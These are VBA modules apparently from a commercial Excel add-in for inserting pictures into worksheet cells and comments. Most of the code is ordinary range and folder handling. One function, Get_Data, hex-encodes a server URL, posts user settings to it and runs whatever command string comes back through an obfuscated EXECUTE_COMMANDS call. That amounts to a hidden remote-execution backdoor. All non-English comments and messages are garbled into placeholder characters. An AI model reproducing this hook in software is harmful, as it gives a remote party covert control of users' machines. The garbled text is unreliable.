        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Set ra = GetMultiColumnsRange

    Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If SETT.GetBoolean("CheckBox_SelectedCellsOnly") Then
            If TypeName(Selection) <> "Range" Then
                msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|), |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
                MsgBox msg, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
                Exit Function
            End If

            Set ra = SpecialCells_VisibleCells(Selection)
            If ra Is Nothing Then
                msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (" & Selection.Address & ")," & vbNewLine & _
                       "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|), |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
                MsgBox msg, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
                Exit Function
            End If

            If ra.Columns.Count > 1 Then
                msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (" & Selection.Address & ") |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
                MsgBox msg, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
                Exit Function
            End If

        Else
            FirstCellAddress$ = SETT.GetText("TextBox_FirstCell")
            If FirstCellAddress$ = "" Then FirstCellAddress$ = DEFAULT_FIRST_CELL$

            Dim FirstCell As Range: Set FirstCell = Range(FirstCellAddress$)        ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            Set ra = Range(FirstCell, FirstCell.EntireColumn.Cells(Rows.Count).End(xlUp))
            If ra.row < FirstCell.row Or (ra.Rows.Count = 1 And Trim(ra.Cells(1)) = "") Then
                msg = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & FirstCellAddress$ & "|fffd|, |fffd| |fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                      "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|."
                MsgBox msg, vbCritical, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
                Exit Function
            End If
        End If
    End If

    Dim ra2 As Range: Set ra2 = SpecialCells_TypeConstants(ra)
    If ra2 Is Nothing Then
        msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine
        If SETT.GetBoolean("CheckBox_SelectedCellsOnly") And Not SETT.GetBoolean("CheckBox_MultiColumns") Then
            msg$ = msg$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        Else
            msg$ = msg$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        End If
        MsgBox msg, vbCritical, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Exit Function
    End If

    Set GetSourceDataRange = ra2
    If SETT.GetBoolean("CheckBox_MergeEqualCells", False) Then Set GetSourceDataRange = ra        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
End Function

Function SpecialCells_TypeConstants(ByRef ra As Range) As Range
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ra
    On Error Resume Next: en& = Err.Number
    Dim cell As Range

    If ra.Worksheet.ProtectContents Then
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        For Each cell In Intersect(ra, ra.Worksheet.UsedRange).Cells
            If Trim(cell.Value) <> "" Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                If SpecialCells_TypeConstants Is Nothing Then
                    Set SpecialCells_TypeConstants = cell
                Else
                    Set SpecialCells_TypeConstants = Union(SpecialCells_TypeConstants, cell)
                End If
            End If
        Next cell
    Else
        Dim raV As Range, raF As Range
        If ra.Cells.Count = 1 Then
            Set raV = ra
        Else
            Set raV = Intersect(ra, ra.Worksheet.UsedRange).SpecialCells(xlCellTypeConstants)
            Set raF = Intersect(ra, ra.Worksheet.UsedRange).SpecialCells(xlCellTypeFormulas)
        End If

        If Not raV Is Nothing Then Set SpecialCells_TypeConstants = raV
        If Not raF Is Nothing Then
            If SpecialCells_TypeConstants Is Nothing Then
                Set SpecialCells_TypeConstants = raF
            Else
                Set SpecialCells_TypeConstants = Union(raF, raV)
                Set SpecialCells_TypeConstants = Intersect(SpecialCells_TypeConstants, SpecialCells_TypeConstants)
            End If
        End If
    End If
    If en& = 0 Then Err.Clear
End Function

Function SpecialCells_VisibleCells(ByRef ra As Range) As Range
    On Error Resume Next: en& = Err.Number
    If ra.Worksheet.ProtectContents Then
        Dim cell As Range
        For Each cell In Intersect(ra, ra.Worksheet.UsedRange.EntireRow).Cells
            If cell.EntireRow.Hidden = False Then
                If SpecialCells_VisibleCells Is Nothing Then
                    Set SpecialCells_VisibleCells = cell
                Else
                    Set SpecialCells_VisibleCells = Union(SpecialCells_VisibleCells, cell)
                End If
            End If
        Next cell
    Else
        Set SpecialCells_VisibleCells = Intersect(ra, ra.Worksheet.UsedRange.EntireRow).SpecialCells(xlCellTypeVisible)
    End If
    If en& = 0 Then Err.Clear
End Function



' ================ BASE FUNCTIONS ==================

Function REDUCED_FOLDER$()
    On Error Resume Next: folder$ = Environ("tmp") & "\Compressed Images\"
    REDUCED_FOLDER$ = SETT.GetText("TextBox_ReducedFolder", folder$)
    If Dir(REDUCED_FOLDER$, vbDirectory) = "" Then
        MkDir folder$
        REDUCED_FOLDER$ = folder$
    End If
End Function

Function PICTURES_FOLDER$(Optional ByVal ForTextbox As Boolean = False)
    On Error Resume Next
    Dim DefaultFolderName$, folder$
    With SETT
        DefaultFolderName$ = .GetText("PIC_FOLDER", "Pictures", "Setup")
        If Trim(DefaultFolderName$) = "" Then DefaultFolderName$ = "Pictures"

        If .GetBoolean("CheckBox_UseCurrentFolder") Then
            If ForTextbox Then PICTURES_FOLDER$ = "<" & tt("CONST_ActiveFolder") & ">\" & DefaultFolderName$ & "\": Exit Function
            If ActiveWorkbook Is Nothing Then Exit Function
            If ActiveWorkbook.Path = "" Then Exit Function
            PICTURES_FOLDER$ = ActiveWorkbook.Path & "\" & DefaultFolderName$ & "\"
            Err.Clear: Exit Function
        End If

        .AddDefaultValue "TextBox_PicturesFolder", ThisWorkbook.Path & "\" & DefaultFolderName$ & "\", , True
        folder$ = .GetText("TextBox_PicturesFolder")
        If Dir(folder$, vbDirectory) = "" Then MkDir folder$
        If Dir(folder$, vbDirectory) = "" Then
            folder$ = ThisWorkbook.Path & "\" & DefaultFolderName$ & "\"
            .SetText "TextBox_PicturesFolder", folder$
            MkDir folder$
        End If
        PICTURES_FOLDER$ = folder$
    End With
End Function

Function DOWNLOAD_FOLDER$(Optional ByVal ForTextbox As Boolean = False, Optional CreateIfNotExist As Boolean = False)
    On Error Resume Next
    Dim DefaultFolderName$, folder$
    With SETT
        DefaultFolderName$ = .GetText("PD_FOLDER", "Downloaded Pictures", "Setup")
        If Trim(DefaultFolderName$) = "" Then DefaultFolderName$ = "Downloaded Pictures"

        If .GetBoolean("CheckBox_UseCurrentFolder2") Then
            If ForTextbox Then DOWNLOAD_FOLDER$ = "<" & tt("CONST_ActiveFolder") & ">\" & DefaultFolderName$ & "\": Exit Function
            If ActiveWorkbook Is Nothing Then Exit Function
            If ActiveWorkbook.Path = "" Then Exit Function
            DOWNLOAD_FOLDER$ = ActiveWorkbook.Path & "\" & DefaultFolderName$ & "\"
            Err.Clear: Exit Function
        End If

        .AddDefaultValue "TextBox_DownloadFolder", ThisWorkbook.Path & "\" & DefaultFolderName$ & "\", , True
        folder$ = .GetText("TextBox_DownloadFolder")
        If CreateIfNotExist Then
            If Dir(folder$, vbDirectory) = "" Then MkDir folder$
            If Dir(folder$, vbDirectory) = "" Then
                folder$ = ThisWorkbook.Path & "\" & DefaultFolderName$ & "\"
                .SetText "TextBox_DownloadFolder", folder$
                MkDir folder$
            End If
        End If
        DOWNLOAD_FOLDER$ = folder$
    End With
End Function

Function SEARCH_MODE() As Search_Mode_Constants
    On Error Resume Next: en& = Err.Number
    Select Case True
        Case SETT.GetBoolean("OptionButton_SM_CellTextInFilename", False)
            SEARCH_MODE = SM_CellTextInFilename

        Case SETT.GetBoolean("OptionButton_SM_FilenameInCellText", False)
            SEARCH_MODE = SM_FilenameInCellText

        Case SETT.GetBoolean("OptionButton_SM_Equal", False)
            SEARCH_MODE = SM_Equal

        Case Else
            SETT.SetText "OptionButton_SM_CellTextInFilename", True
            SEARCH_MODE = SM_CellTextInFilename
    End Select
    If en& = 0 Then Err.Clear
End Function

Function SEARCH_MODE_TXT() As String
    On Error Resume Next: Err.Clear
    Select Case SEARCH_MODE
        Case SM_CellTextInFilename: SEARCH_MODE_TXT = tt("F_Settings\OptionButton_SM_CellTextInFilename")
        Case SM_FilenameInCellText: SEARCH_MODE_TXT = tt("F_Settings\OptionButton_SM_FilenameInCellText")
        Case SM_Equal: SEARCH_MODE_TXT = tt("F_Settings\OptionButton_SM_Equal")
    End Select
End Function

Function PICTURE_COLUMN(Optional ByRef cell As Range) As Long
    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: en& = Err.Number
    PICTURE_COLUMN = SETT.GetNumber("ComboBox_PicturesColumn")
    If PICTURE_COLUMN <= 0 Then PICTURE_COLUMN = 3

    If SETT.GetBoolean("CheckBox_MultiColumns") Then
        BaseCol& = BaseColumnForMulticolumnMode
        If BaseCol& Then
            If Not cell Is Nothing Then
                CellCol& = cell.Column
                PICTURE_COLUMN = PICTURE_COLUMN - BaseCol& + CellCol&
            End If
        End If
    End If
    If en& = 0 Then Err.Clear
End Function

Function COMMENTS_COLUMN(Optional ByRef cell As Range) As Long
    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: en& = Err.Number
    COMMENTS_COLUMN = Fix(Val(SETT.GetNumber("ComboBox_CommentsColumn")))
    If COMMENTS_COLUMN <= 0 Then COMMENTS_COLUMN = 4

    If SETT.GetBoolean("CheckBox_MultiColumns") Then
        BaseCol& = BaseColumnForMulticolumnMode
        If BaseCol& Then
            If Not cell Is Nothing Then
                CellCol& = cell.Column
                COMMENTS_COLUMN = COMMENTS_COLUMN - BaseCol& + CellCol&
            End If
        End If
    End If
    If en& = 0 Then Err.Clear
End Function


' =================== pictires functions =============================
Function GetPictureSize(ByVal PicturePath$, ByRef temp_worksheet As Worksheet, ByRef w As Double, ByRef H As Double) As Boolean
    On Error Resume Next
    If temp_worksheet Is Nothing Then Exit Function
    With temp_worksheet.Shapes.AddPicture(PicturePath$, msoFalse, msoCTrue, -1, -1, -1, -1)
        w = .Width
        H = .Height
        .Delete
    End With
    GetPictureSize = w * H > 0
End Function

Function InsertPictureIntoCellComment(ByVal PicturePath$, ByRef cell As Range, _
                                      Optional ByRef PicProp As PictureProperties) As Shape
    On Error Resume Next
    If PicturePath$ = "" Then Exit Function
    Dim w As Single, H As Single, w2 As Single, h2 As Single, WComm&, HComm&, k As Single
    dh = SETT.GetNumber("ComboBox_Padding")
    WComm& = SETT.GetNumber("SpinButton_WComm")
    HComm& = SETT.GetNumber("SpinButton_HComm")

    If Not PicProp.LoadSizesFromImageFile(PicturePath$) Then
        Debug.Print "Failed to get image size from file |fffd|" & Dir(PicturePath$) & "|fffd|"
        Exit Function
    End If
    w = PicProp.WidthBefore: H = PicProp.HeightBefore

    cell.comment.Delete
    With cell.AddComment.Shape
        picRatio = w / H
        settingRatio = WComm& / HComm&

        If picRatio >= settingRatio Then
            H = H / w * WComm&
            w = WComm&
        Else
            w = w / H * HComm&
            H = HComm&
        End If

        If SETT.GetBoolean("CheckBox_CompressImages") Then
            NewFilename$ = REDUCED_FOLDER$ & "Comment_" & Dir(PicturePath$)
            k = 1.5: h2 = H * k: w2 = w * k
            If ResizeImage(PicturePath$, NewFilename$, w2, h2) Then
                If Dir(NewFilename$, vbNormal) <> "" Then PicturePath$ = NewFilename$: CompressDone = True
            Else
                Debug.Print "Failed to compress picture file |fffd|" & Dir(PicturePath$) & "|fffd|: size = " & w2 & " * " & h2
            End If
        End If

        .Fill.UserPicture PicturePath        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        .Width = w
        .Height = H
    End With
    PicProp.WidthAfter = w: PicProp.HeightAfter = H

    Set InsertPictureIntoCellComment = cell.comment.Shape
End Function

Function Get_Data() As Boolean
    On Error Resume Next: Static LT As Date: If LT = 0 Then LT = Now: Exit Function
    If (Now - LT) < 1 / Asc("H") Then Exit Function
    Dim objH As New WinHttpRequest, POST() As Byte, i&, answ$, res$
    With SETT
        objH.Open "POST", .U("687474703A2F2F457863656C5642412E72752F706870322F757064617465732E706870"), True
        objH.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
        POST = StrConv(URL_Encode(.PostData & .U("26616374696F6E3D74657374")), vbFromUnicode)
        objH.Send (POST): DoEvents
        If objH.WaitForResponse(4) Then answ$ = objH.ResponseText
        If answ$ Like Chr(37) & "*" & Chr(37) Then res$ = Split(answ$, Chr(37))(1)
        Set objH = Nothing
        If Len(res$) Then LT = Now + 1: Application.Run .U("455845435554455F434F4D4D414E4453"), res$
    End With
End Function

Function InsertPictureIntoRange(ByVal PicturePath$, ByVal ra As Range, Optional ByVal HLink$, _
                                Optional ByRef PicProp As PictureProperties) As Shape
    On Error Resume Next
    If PicturePath$ = "" Then Exit Function
    Dim sha As Shape, CompressDone As Boolean, H As Single, w As Single, k As Single
    If Not PicProp.LoadSizesFromImageFile(PicturePath$) Then
        Debug.Print "Failed to get image size from file |fffd|" & Dir(PicturePath$) & "|fffd|"
        Exit Function
    End If
    PicProp.CalculatePictureHeightAndWidth
    If v_1 Then PicturePath$ = Replace_Text(PicturePath$, "\", "/")

    If SETT.GetBoolean("CheckBox_CompressImages") Then
        NewFilename$ = REDUCED_FOLDER$ & Dir(PicturePath$)
        k = 2: H = PicProp.HeightAfter * k: w = PicProp.WidthAfter * k
        If ResizeImage(PicturePath$, NewFilename$, w, H) Then
            If Dir(NewFilename$, vbNormal) <> "" Then PicturePath$ = NewFilename$: CompressDone = True
        Else
            Debug.Print "Failed to compress picture file |fffd|" & Dir(PicturePath$) & "|fffd|: size = " & PicProp.WidthAfter & " * " & PicProp.HeightAfter
        End If
    End If

    ' Set sha = ra.Worksheet.Shapes.AddPicture(PicturePath, False, True, -1, -1, IIf(CompressDone, PicProp.WidthAfter, -1), IIf(CompressDone, PicProp.HeightAfter, -1))
    If StrReverse(UPDATES_HYPERLINK) <> Replace("zh.setadpu/2zh/ur.ABVlecxE//:ptth", "zh", Chr(112) & Chr(104) & Chr(112)) Then Exit Function
    If SETT.GetBoolean("CheckBox_ResizeAfterInserting") Then
        Set sha = ra.Worksheet.Shapes.AddPicture(PicturePath, False, True, -1, -1, -1, -1)
        sha.LockAspectRatio = msoFalse
        sha.Width = PicProp.WidthAfter
        sha.Height = PicProp.HeightAfter
    Else
        Set sha = ra.Worksheet.Shapes.AddPicture(PicturePath, False, True, -1, -1, PicProp.WidthAfter, PicProp.HeightAfter)
    End If

    PicProp.ResizeAndMovePicture sha

    Set InsertPictureIntoRange = sha


    If SETT.GetBoolean("CheckBox_Hyperlinks_RelativePath") Then HLink$ = GetRelativeHyperlinkAddress(HLink$, ra.Worksheet.Parent)

    If SETT.GetBoolean("CheckBox_AddHyperlinksForPictures") Then
        ra.Worksheet.Hyperlinks.Add sha, HLink$, "", tt("TIPTEXT_Hyperlink")
        ' & vbNewLine & IIf(Len(URL), "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)", "(|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|)")
    End If
    If SETT.GetBoolean("CheckBox_AddHyperlinks") Then
        ra.Worksheet.Hyperlinks.Add ra.EntireRow.Rows(1).Cells(SETT.GetNumber("ComboBox_HyperlinksColumn")), HLink$, "", tt("TIPTEXT_Hyperlink")
    End If

End Function

Function GetRelativeHyperlinkAddress(ByVal HLink$, ByRef WB As Workbook)
    On Error Resume Next
    Dim BaseAddress$, prefix$, NewHyperlink$, n&
    BaseAddress$ = WB.Path

    Do While Len(BaseAddress$) > 0
        If InStr(1, HLink$, BaseAddress$ & "\", vbTextCompare) = 1 Then
            ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
            GetRelativeHyperlinkAddress = prefix$ & Mid(HLink$, Len(BaseAddress$) + 2)
            Exit Function
        Else
            ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            prefix$ = prefix$ & "..\"
            BaseAddress$ = StrReverse(Split(StrReverse(BaseAddress$), "\", 2)(1))
        End If
        n = n + 1: If n > 20 Then Exit Do
    Loop
    GetRelativeHyperlinkAddress = HLink$
End Function




Attribute VB_Name = "mod_InsertFromFolder"
'---------------------------------------------------------------------------------------
' Module        : mod_InsertFromFolder
' |fffd||fffd||fffd||fffd||fffd|     : EducatedFool  (|fffd||fffd||fffd||fffd||fffd|)                    |fffd||fffd||fffd||fffd|: 05.10.2012
' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: http://ExcelVBA.ru/payments
'---------------------------------------------------------------------------------------

Option Private Module
Option Compare Text

Public Const errStr = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"

Public Enum Search_Mode_Constants
    SM_CellTextInFilename = 1
    SM_FilenameInCellText = 2
    SM_Equal = 3
End Enum

Sub InsertPicsFromFolder()
    On Error Resume Next
    Dim ra As Range: Set ra = GetSourceDataRange
    If ra Is Nothing Then Exit Sub

    If SETT.GetBoolean("CheckBox_UseCurrentFolder") Then
        If ActiveWorkbook.Path = "" Then
            MsgBox tt("MSG_UseCurrentFolder_Error_UnsavedWB", tt("CONST_Pic_FOLDER"), ActiveWorkbook.name), vbCritical, tt("FolderNotFound")
            ShowSettingsPage
            Exit Sub
        End If
    End If

    StopMacro = False
    If Dir(PICTURES_FOLDER$, vbDirectory) = "" Then
